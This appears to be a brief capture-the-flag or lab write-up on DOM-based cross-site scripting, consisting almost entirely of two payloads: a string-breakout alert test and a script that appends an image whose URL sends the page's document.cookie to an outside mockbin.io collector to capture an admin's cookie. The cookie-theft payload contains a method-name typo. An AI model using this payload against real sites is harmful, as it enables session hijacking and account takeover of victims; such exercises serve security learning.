# XSS DOM based

## Initial attempt

Achieve XSS through a relatively simple payloa

```javascript
';alert(1); var s='
```

## Admin's cookie

```javascript
'; var i = document.createElement('img'); i.src='https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/?cookie=' + document.cookie; document.getElementByTagName('p')[0].appendChild(i); var s='
```
